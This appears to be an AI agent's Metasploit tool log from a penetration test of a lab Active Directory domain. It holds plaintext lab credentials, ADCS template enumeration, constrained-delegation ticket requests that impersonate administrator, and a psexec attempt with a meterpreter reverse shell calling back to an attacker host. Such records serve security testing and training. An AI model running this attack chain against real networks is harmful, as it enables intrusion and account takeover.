{
  "type": "auxiliary",
  "name": "Misconfigured Certificate Template Finder",
  "fullname": "auxiliary/gather/ldap_esc_vulnerable_cert_finder",
  "rank": "normal",
  "disclosuredate": "2021-06-17",
  "description": "This module allows users to query a LDAP server for vulnerable certificate templates and will print these certificates out in a table along with which attack they are vulnerable to and the SIDs that can be used to enroll in that certificate template. Additionally the module will also print out a list of known certificate servers along with info about which vulnerable certificate templates the certificate server allows enrollment in and which SIDs are authorized to use that certificate server to perform this enrollment operation. Currently the module is capable of checking for certificates that are vulnerable to ESC1, ESC2, ESC3, ESC4, ESC13, and ESC15. The module is limited to checking for these techniques due to them being identifiable remotely from a normal user account by analyzing the objects in LDAP. The module can also check for ESC9, ESC10 and ESC16 but this requires an Administrative WinRM session to be established to definitively check for these techniques.",
  "license": "Metasploit Framework License (BSD)",
  "filepath": "/opt/metasploit-framework/embedded/framework/modules/auxiliary/gather/ldap_esc_vulnerable_cert_finder.rb",
  "arch": [],
  "platform": [],
  "authors": [
    "Grant Willcox",
    "Spencer McIntyre",
    "jheysel-r7"
  ],
  "privileged": false,
  "check": false,
  "default_options": {
    "SSL": false
  },
  "references": [
    [
      "URL",
      "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
    ],
    [
      "URL",
      "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"
    ],
    [
      "URL",
      "https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"
    ],
    [
      "URL",
      "https://trustedsec.com/blog
... (truncated)
```

---

### Phase: post_exploitation

#### ✅ msf_console_execute
*2025-12-17 12:17:47* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"use auxiliary/gather/ldap_esc_vulnerable_cert_finder"}
```

**Output:**
```
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

```

---

#### ✅ msf_console_execute
*2025-12-17 12:17:52* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.10"}
```

**Output:**
```
RHOSTS => 10.50.0.10

```

---

#### ✅ msf_console_execute
*2025-12-17 12:17:56* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set LDAPUsername tywin.lannister"}
```

**Output:**
```
LDAPUsername => tywin.lannister

```

---

#### ✅ msf_console_execute
*2025-12-17 12:18:01* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set LDAPPassword powerkingftw135"}
```

**Output:**
```
LDAPPassword => powerkingftw135

```

---

#### ✅ msf_console_execute
*2025-12-17 12:18:05* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set LDAPDomain sevenkingdoms.local"}
```

**Output:**
```
LDAPDomain => sevenkingdoms.local

```

---

#### ❌ msf_console_execute
*2025-12-17 12:18:09* | Target: `1` | Duration: 29888ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Running module against 10.50.0.10
[*] Discovering base DN automatically
[*] user: tywin.lannister, domain: sevenkingdoms.local
[!] Unable to determine the version of Window so these all might be false postives! WinRM authorization error: WinRM::WinRMAuthorizationError
[!] No IP addresses were found for kingslanding.sevenkingdoms.local via DNS.
[!] Couldn't find any vulnerable ESC13 templates!
[+] Template: Administrator
[*]   Distinguished Name: CN=Administrator,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sevenkingdoms,DC=local
[*]   Manager Approval: Disabled
[*]   Required Signatures: 0
[+]   Vulnerable to: ESC3_TEMPLATE_2
[!]   Potentially vulnerable to: ESC16_2 (the template is in a vulnerable configuration but in order to exploit registry key StrongCertificateBindingEnforcement must be set to 2 and the CA must have the SID security extention OID: 1.3.6.1.4.1.311.25.2 listed under the DisbaledExtensionlist registry key and EDITF_ATTRIBUTESUBJECTALTNAME2 enabled in the EditFlags policy).
[*]   Permissions: READ
[*]   Notes: ESC16_2: Template appears to be vulnerable (most templates do)
[*]   Certificate Template Write-Enabled SIDs:
[*]   Certificate Template Enrollment SIDs:
[*]     * S-1-5-21-320294251-1534116053-1819042690-512 (Domain Admins)
[*]     * S-1-5-21-320294251-1534116053-1819042690-519 (Enterprise Admins)
[+]   Issuing CA: SEVENKINGDOMS-CA (kingslanding.sevenkingdoms.local)
[*]     Enrollment SIDs:
[*]       * S-1-5-11 (Authenticated Users)
[*]       * S-1-5-21-320294251-1534116053-1819042690-519 (Enterprise Admins)
[+] Template: EFS
[*]   Distinguished Name: CN=EFS,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sevenkingdoms,DC=local
[*]   Manager Approval: Disabled
[*]   Required Signatures: 0
[*]   Vulnerable to: (none)
[!]   Potentially vulnerable to: ESC16_2 (the template is in a vulnerable configuration but in order to exploit registry key StrongCertificateBindingEnforceme
... (truncated)
```

---

#### ✅ msf_console_execute
*2025-12-17 12:18:54* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set REPORT all"}
```

**Output:**
```
REPORT => all

```

---

#### ❌ msf_console_execute
*2025-12-17 12:18:58* | Target: `1` | Duration: 29837ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Running module against 10.50.0.10
[*] Discovering base DN automatically
[*] user: tywin.lannister, domain: sevenkingdoms.local
[!] Unable to determine the version of Window so these all might be false postives! WinRM authorization error: WinRM::WinRMAuthorizationError
[!] No IP addresses were found for kingslanding.sevenkingdoms.local via DNS.
[!] Couldn't find any vulnerable ESC13 templates!
[+] Template: Administrator
[*]   Distinguished Name: CN=Administrator,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sevenkingdoms,DC=local
[*]   Manager Approval: Disabled
[*]   Required Signatures: 0
[+]   Vulnerable to: ESC3_TEMPLATE_2
[!]   Potentially vulnerable to: ESC16_2 (the template is in a vulnerable configuration but in order to exploit registry key StrongCertificateBindingEnforcement must be set to 2 and the CA must have the SID security extention OID: 1.3.6.1.4.1.311.25.2 listed under the DisbaledExtensionlist registry key and EDITF_ATTRIBUTESUBJECTALTNAME2 enabled in the EditFlags policy).
[*]   Permissions: READ
[*]   Notes: ESC16_2: Template appears to be vulnerable (most templates do)
[*]   Certificate Template Write-Enabled SIDs:
[*]   Certificate Template Enrollment SIDs:
[*]     * S-1-5-21-320294251-1534116053-1819042690-512 (Domain Admins)
[*]     * S-1-5-21-320294251-1534116053-1819042690-519 (Enterprise Admins)
[+]   Issuing CA: SEVENKINGDOMS-CA (kingslanding.sevenkingdoms.local)
[*]     Enrollment SIDs:
[*]       * S-1-5-11 (Authenticated Users)
[*]       * S-1-5-21-320294251-1534116053-1819042690-519 (Enterprise Admins)
[+] Template: CA
[*]   Distinguished Name: CN=CA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sevenkingdoms,DC=local
[*]   Manager Approval: Disabled
[*]   Required Signatures: 0
[+]   Vulnerable to: ESC1, ESC2, ESC3_TEMPLATE_2
[*]   Permissions: READ
[*]   Notes:
[*]     * ESC1: Request can specify a subjectAltName (msPKI-Certificate-Name-Flag) and EKUs permit aut
... (truncated)
```

---

#### ✅ msf_console_execute
*2025-12-17 12:19:41* | Target: `1` | Duration: 30203ms

**Input:**
```json
{"id":"1","command":"sessions -i 3"}
```

**Output:**
```
[*] Starting interaction with 3...


```

---

#### ✅ msf_console_execute
*2025-12-17 12:20:18* | Target: `1` | Duration: 30204ms

**Input:**
```json
{"id":"1","command":"execute -f powershell.exe -a \"-c \\\"$searcher = New-Object DirectoryServices.DirectorySearcher; $searcher.SearchRoot = [ADSI]'LDAP://DC=north,DC=sevenkingdoms,DC=local'; $searcher.Filter = '(userAccountControl:1.2.840.113556.1.4.803:=524288)'; $searcher.FindAll() | ForEach-Object { $_.Properties['samaccountname'] + ' - ' + $_.Properties['distinguishedname'] }\\\"\" -i -H"}
```

**Output:**
```
Process 6860 created.
Channel 6 created.
WINTERFELL$
 - 
CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local

```

---

### Phase: enumeration

#### ✅ msf_db_status
*2025-12-17 12:21:04* | Duration: 9ms

**Input:**
```json
{}
```

**Output:**
```
{
  "driver": "postgresql",
  "db": "msf"
}
```

---

### Phase: post_exploitation

#### ✅ msf_console_execute
*2025-12-17 12:22:21* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"background"}
```

**Output:**
```
[*] Backgrounding session 3...

```

---

#### ✅ msf_console_execute
*2025-12-17 12:22:29* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"use auxiliary/scanner/smb/smb_login"}
```

**Output:**
```
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session

```

---

#### ✅ msf_console_execute
*2025-12-17 12:22:37* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.11"}
```

**Output:**
```
RHOSTS => 10.50.0.11

```

---

#### ✅ msf_console_execute
*2025-12-17 12:22:41* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set SMBUser jon.snow"}
```

**Output:**
```
SMBUser => jon.snow

```

---

#### ✅ msf_console_execute
*2025-12-17 12:22:46* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set SMBPass iknownothing"}
```

**Output:**
```
SMBPass => iknownothing

```

---

#### ✅ msf_console_execute
*2025-12-17 12:22:53* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set SMBDomain NORTH"}
```

**Output:**
```
SMBDomain => NORTH

```

---

#### ✅ msf_console_execute
*2025-12-17 12:22:57* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] 10.50.0.11:445        - 10.50.0.11:445        - Starting SMB login bruteforce
[+] 10.50.0.11:445        - 10.50.0.11:445        - Success: 'NORTH\jon.snow:iknownothing'
[*] 10.50.0.11:445        - Scanned 1 of 1 hosts (100% complete)
[*] 10.50.0.11:445        - Bruteforce completed, 1 credential was successful.
[*] 10.50.0.11:445        - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed

```

---

#### ✅ msf_console_execute
*2025-12-17 12:23:04* | Target: `1` | Duration: 30196ms

**Input:**
```json
{"id":"1","command":"sessions -i 3"}
```

**Output:**
```
[*] Starting interaction with 3...


```

---

#### ✅ msf_console_execute
*2025-12-17 12:23:51* | Target: `1` | Duration: 30193ms

**Input:**
```json
{"id":"1","command":"execute -f powershell.exe -a \"-c \\\"$searcher = New-Object DirectoryServices.DirectorySearcher; $searcher.SearchRoot = [ADSI]'LDAP://DC=north,DC=sevenkingdoms,DC=local'; $searcher.Filter = '(msDS-AllowedToDelegateTo=*)'; $searcher.FindAll() | ForEach-Object { $_.Properties['samaccountname'][0] + ': ' + ($_.Properties['msds-allowedtodelegateto'] -join ', ') }\\\"\" -i -H"}
```

**Output:**
```
Process 5496 created.
Channel 7 created.
jon.snow: CIFS/winterfell, CIFS/winterfell.north.sevenkingdoms.local
CASTELBLACK$: HTTP/winterfell, HTTP/winterfell.north.sevenkingdoms.local

```

---

### Phase: enumeration

#### ✅ msf_module_search
*2025-12-17 12:24:50* | Duration: 62ms

**Input:**
```json
{"query":"kerberos s4u"}
```

**Output:**
```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/forge_ticket",
    "rank": "normal"
  }
]
```

---

#### ✅ msf_module_search
*2025-12-17 12:24:54* | Duration: 63ms

**Input:**
```json
{"query":"kerberos delegation"}
```

**Output:**
```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/ldap/rbcd",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/gather/ldap_query",
    "rank": "normal"
  }
]
```

---

#### ✅ msf_module_search
*2025-12-17 12:25:01* | Duration: 93ms

**Input:**
```json
{"query":"kerberos ticket"}
```

**Output:**
```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/dcerpc/esc_update_ldap_object",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/forge_ticket",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/get_ticket",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/inspect_ticket",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/keytab",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/ms14_068_kerberos_checksum",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/admin/kerberos/ticket_converter",
    "rank": "normal"
  },
  {
    "type": "post",
    "name": "post/multi/gather/unix_kerberos_tickets",
    "rank": "normal"
  },
  {
    "type": "post",
    "name": "post/windows/escalate/golden_ticket",
    "rank": "normal"
  },
  {
    "type": "post",
    "name": "post/windows/manage/kerberos_tickets",
    "rank": "normal"
  }
]
```

---

#### ✅ msf_module_info
*2025-12-17 12:25:08* | Duration: 10ms

**Input:**
```json
{"type":"auxiliary","name":"auxiliary/admin/kerberos/get_ticket"}
```

**Output:**
```
{
  "type": "auxiliary",
  "name": "Kerberos TGT/TGS Ticket Requester",
  "fullname": "auxiliary/admin/kerberos/get_ticket",
  "rank": "normal",
  "disclosuredate": "",
  "description": "This module requests TGT/TGS Kerberos tickets from the KDC",
  "license": "Metasploit Framework License (BSD)",
  "filepath": "/opt/metasploit-framework/embedded/framework/modules/auxiliary/admin/kerberos/get_ticket.rb",
  "arch": [],
  "platform": [],
  "authors": [
    "Christophe De La Fuente",
    "Spencer McIntyre",
    "Will Schroeder",
    "Lee Christensen",
    "Oliver Lyak",
    "smashery"
  ],
  "privileged": false,
  "check": false,
  "default_options": null,
  "references": [],
  "actions": {
    "0": "GET_TGT",
    "1": "GET_TGS",
    "2": "GET_HASH"
  },
  "default_action": "GET_TGT",
  "stance": "aggressive",
  "options": {
    "WORKSPACE": {
      "type": "string",
      "required": false,
      "advanced": true,
      "desc": "Specify the workspace for this module"
    },
    "VERBOSE": {
      "type": "bool",
      "required": false,
      "advanced": true,
      "desc": "Enable detailed status messages",
      "default": false
    },
    "RHOSTS": {
      "type": "rhosts",
      "required": true,
      "advanced": false,
      "desc": "The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html"
    },
    "RPORT": {
      "type": "port",
      "required": true,
      "advanced": false,
      "desc": "The target port",
      "default": 88
    },
    "Timeout": {
      "type": "integer",
      "required": true,
      "advanced": false,
      "desc": "The TCP timeout to establish Kerberos connection and read data",
      "default": 10
    },
    "DOMAIN": {
      "type": "string",
      "required": false,
      "advanced": false,
      "desc": "The Fully Qualified Domain Name (FQDN). Ex: mydomain.local"
    },
    "USERNAME": {
      "type": "string",
      "required": false,
      "advanced": false,
      "desc": "The doma
... (truncated)
```

---

### Phase: post_exploitation

#### ✅ msf_console_execute
*2025-12-17 12:25:14* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"background"}
```

**Output:**
```
[*] Backgrounding session 3...

```

---

#### ✅ msf_console_execute
*2025-12-17 12:25:22* | Target: `1` | Duration: 513ms

**Input:**
```json
{"id":"1","command":"use auxiliary/admin/kerberos/get_ticket"}
```

**Output:**
```
[*] Setting default action GET_TGT - view all 3 actions with the show actions command

```

---

#### ✅ msf_console_execute
*2025-12-17 12:25:29* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set ACTION GET_TGS"}
```

**Output:**
```
ACTION => GET_TGS

```

---

#### ✅ msf_console_execute
*2025-12-17 12:25:34* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.11"}
```

**Output:**
```
RHOSTS => 10.50.0.11

```

---

#### ✅ msf_console_execute
*2025-12-17 12:25:40* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set DOMAIN north.sevenkingdoms.local"}
```

**Output:**
```
DOMAIN => north.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:25:44* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set USERNAME jon.snow"}
```

**Output:**
```
USERNAME => jon.snow

```

---

#### ✅ msf_console_execute
*2025-12-17 12:25:48* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set PASSWORD iknownothing"}
```

**Output:**
```
PASSWORD => iknownothing

```

---

#### ✅ msf_console_execute
*2025-12-17 12:25:53* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set SPN CIFS/winterfell.north.sevenkingdoms.local"}
```

**Output:**
```
SPN => CIFS/winterfell.north.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:25:57* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set IMPERSONATE administrator"}
```

**Output:**
```
IMPERSONATE => administrator

```

---

#### ✅ msf_console_execute
*2025-12-17 12:26:02* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Running module against 10.50.0.11
[+] 10.50.0.11:88 - Received a valid TGT-Response
[*] 10.50.0.11:88 - TGT MIT Credential Cache ticket saved to /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_573011.bin
[*] 10.50.0.11:88 - Getting TGS impersonating administrator@north.sevenkingdoms.local (SPN: CIFS/winterfell.north.sevenkingdoms.local)
[+] 10.50.0.11:88 - Received a valid TGS-Response
[*] 10.50.0.11:88 - TGS MIT Credential Cache ticket saved to /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_987641.bin
[+] 10.50.0.11:88 - Received a valid TGS-Response
[*] 10.50.0.11:88 - TGS MIT Credential Cache ticket saved to /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[*] Auxiliary module execution completed

```

---

#### ✅ msf_console_execute
*2025-12-17 12:26:11* | Target: `1` | Duration: 512ms

**Input:**
```json
{"id":"1","command":"use exploit/windows/smb/psexec"}
```

**Output:**
```
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

```

---

#### ✅ msf_console_execute
*2025-12-17 12:26:16* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set RHOSTS winterfell.north.sevenkingdoms.local"}
```

**Output:**
```
RHOSTS => winterfell.north.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:26:20* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set SMB::Auth kerberos"}
```

**Output:**
```
SMB::Auth => kerberos

```

---

#### ✅ msf_console_execute
*2025-12-17 12:26:26* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set SMB::Krb5Ccname /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin"}
```

**Output:**
```
SMB::Krb5Ccname => /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin

```

---

#### ✅ msf_console_execute
*2025-12-17 12:26:30* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set SMBDomain NORTH"}
```

**Output:**
```
SMBDomain => NORTH

```

---

#### ✅ msf_console_execute
*2025-12-17 12:26:35* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set SMB::Rhostname winterfell.north.sevenkingdoms.local"}
```

**Output:**
```
SMB::Rhostname => winterfell.north.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:26:40* | Target: `1` | Duration: 505ms

**Input:**
```json
{"id":"1","command":"set LHOST 10.50.0.1"}
```

**Output:**
```
LHOST => 10.50.0.1

```

---

#### ✅ msf_console_execute
*2025-12-17 12:26:44* | Target: `1` | Duration: 506ms

**Input:**
```json
{"id":"1","command":"set LPORT 4453"}
```

**Output:**
```
LPORT => 4453

```

---

#### ❌ msf_console_execute
*2025-12-17 12:26:50* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[-] Msf::OptionValidateError The following options failed to validate:
[-] Invalid option RHOSTS: Host resolution failed: winterfell.north.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:26:55* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.11"}
```

**Output:**
```
RHOSTS => 10.50.0.11

```

---

#### ❌ msf_console_execute
*2025-12-17 12:27:00* | Target: `1` | Duration: 2305ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Started reverse TCP handler on 10.50.0.1:4453 
[*] 10.50.0.11:445 - Connecting to the server...
[*] 10.50.0.11:445 - Authenticating to 10.50.0.11:445|NORTH as user 'tywin.lannister'...
[-] 10.50.0.11:445 - Failed to load a usable credential from ticket file: /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[-] 10.50.0.11:445 - Attempt failed to find a valid credential in /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin for realm="NORTH", sname=nil, sname_hostname="winterfell.north.sevenkingdoms.local":
[-] 10.50.0.11:445 -   Filtered credential /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin #1 reason:  Realm (NORTH) does not match (realm: NORTH.SEVENKINGDOMS.LOCAL)
[-] 10.50.0.11:445 - Attempt failed to find a valid credential in /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin for realm="NORTH", sname="krbtgt/north.sevenkingdoms.local", sname_hostname=nil
[-] 10.50.0.11:445 -   Filtered credential /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin #1 reason:  Realm (NORTH) does not match (realm: NORTH.SEVENKINGDOMS.LOCAL)
[-] 10.50.0.11:445 - Exploit failed: Rex::Proto::Kerberos::Model::Error::KerberosError Failed to load a usable credential from ticket file: /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[*] Exploit completed, but no session was created.

```

---

#### ✅ msf_console_execute
*2025-12-17 12:27:07* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set SMBDomain NORTH.SEVENKINGDOMS.LOCAL"}
```

**Output:**
```
SMBDomain => NORTH.SEVENKINGDOMS.LOCAL

```

---

#### ❌ msf_console_execute
*2025-12-17 12:27:11* | Target: `1` | Duration: 1672ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Started reverse TCP handler on 10.50.0.1:4453 
[*] 10.50.0.11:445 - Connecting to the server...
[*] 10.50.0.11:445 - Authenticating to 10.50.0.11:445|NORTH.SEVENKINGDOMS.LOCAL as user 'tywin.lannister'...
[-] 10.50.0.11:445 - Failed to load a usable credential from ticket file: /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[-] 10.50.0.11:445 - Attempt failed to find a valid credential in /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin for realm="NORTH.SEVENKINGDOMS.LOCAL", sname=nil, sname_hostname="winterfell.north.sevenkingdoms.local":
[-] 10.50.0.11:445 -   Filtered credential /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin #1 reason: Username (tywin.lannister) does not match (username: administrator)
[-] 10.50.0.11:445 - Attempt failed to find a valid credential in /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin for realm="NORTH.SEVENKINGDOMS.LOCAL", sname="krbtgt/north.sevenkingdoms.local", sname_hostname=nil
[-] 10.50.0.11:445 -   Filtered credential /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin #1 reason: SPN (krbtgt/north.sevenkingdoms.local) does not match (spn: CIFS/winterfell.north.sevenkingdoms.local)
[-] 10.50.0.11:445 - Exploit failed: Rex::Proto::Kerberos::Model::Error::KerberosError Failed to load a usable credential from ticket file: /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[*] Exploit completed, but no session was created.

```

---

#### ✅ msf_console_execute
*2025-12-17 12:27:18* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set SMBUser administrator"}
```

**Output:**
```
SMBUser => administrator

```

---

#### ❌ msf_console_execute
*2025-12-17 12:27:22* | Target: `1` | Duration: 17786ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Started reverse TCP handler on 10.50.0.1:4453 
[*] 10.50.0.11:445 - Connecting to the server...
[*] 10.50.0.11:445 - Authenticating to 10.50.0.11:445|NORTH.SEVENKINGDOMS.LOCAL as user 'administrator'...
[*] 10.50.0.11:445 - Patching sname from CIFS/winterfell.north.sevenkingdoms.local to cifs/winterfell.north.sevenkingdoms.local
[*] 10.50.0.11:445 - Loaded a credential from ticket file: /home/tuomo/.msf4/loot/20251217122603_default_10.50.0.11_mit.kerberos.cca_500674.bin
[*] 10.50.0.11:445 - Selecting PowerShell target
[*] 10.50.0.11:445 - Executing the payload...
[-] 10.50.0.11:445 - Service failed to start - ACCESS_DENIED
[*] Exploit completed, but no session was created.

```

---

### Phase: enumeration

#### ✅ msf_module_search
*2025-12-17 12:27:48* | Duration: 81ms

**Input:**
```json
{"query":"smb_exec"}
```

**Output:**
```
No modules found matching query.
```

---

#### ✅ msf_module_search
*2025-12-17 12:27:55* | Duration: 48ms

**Input:**
```json
{"query":"wmi exec"}
```

**Output:**
```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/scanner/smb/impacket/wmiexec",
    "rank": "normal"
  },
  {
    "type": "exploit",
    "name": "exploit/linux/http/nagios_xi_configwizards_authenticated_rce",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/browser/ie_createobject",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/browser/wmi_admintools",
    "rank": "great"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/ftp/freefloatftp_wbem",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/ftp/open_ftpd_wbem",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/http/miniweb_upload_wbem",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/http/oracle_btm_writetofile",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/http/oracle_event_processing_upload",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/local/ps_wmi_exec",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/local/wmi",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/local/wmi_persistence",
    "rank": "normal"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/misc/ibm_director_cim_dllinject",
    "rank": "excellent"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/misc/solidworks_workgroup_pdmwservice_file_write",
    "rank": "good"
  },
  {
    "type": "exploit",
    "name": "exploit/windows/smb/ms10_061_spoolss",
    "rank": "excellent"
  },
  {
    "type": "post",
    "name": "post/windows/gather/wmic_command",
    "rank": "normal"
  }
]
```

---

### Phase: post_exploitation

#### ✅ msf_console_execute
*2025-12-17 12:28:00* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"use auxiliary/admin/kerberos/get_ticket"}
```

**Output:**
```
[*] Setting default action GET_TGS - view all 3 actions with the show actions command

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:05* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.11"}
```

**Output:**
```
RHOSTS => 10.50.0.11

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:09* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set DOMAIN north.sevenkingdoms.local"}
```

**Output:**
```
DOMAIN => north.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:14* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set USERNAME jon.snow"}
```

**Output:**
```
USERNAME => jon.snow

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:21* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set PASSWORD iknownothing"}
```

**Output:**
```
PASSWORD => iknownothing

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:26* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set SPN CIFS/winterfell.north.sevenkingdoms.local"}
```

**Output:**
```
SPN => CIFS/winterfell.north.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:30* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set IMPERSONATE eddard.stark"}
```

**Output:**
```
IMPERSONATE => eddard.stark

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:36* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Running module against 10.50.0.11
[*] Using cached credential for krbtgt/NORTH.SEVENKINGDOMS.LOCAL@NORTH.SEVENKINGDOMS.LOCAL jon.snow@NORTH.SEVENKINGDOMS.LOCAL
[*] 10.50.0.11:88 - Getting TGS impersonating eddard.stark@north.sevenkingdoms.local (SPN: CIFS/winterfell.north.sevenkingdoms.local)
[+] 10.50.0.11:88 - Received a valid TGS-Response
[*] 10.50.0.11:88 - TGS MIT Credential Cache ticket saved to /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_306168.bin
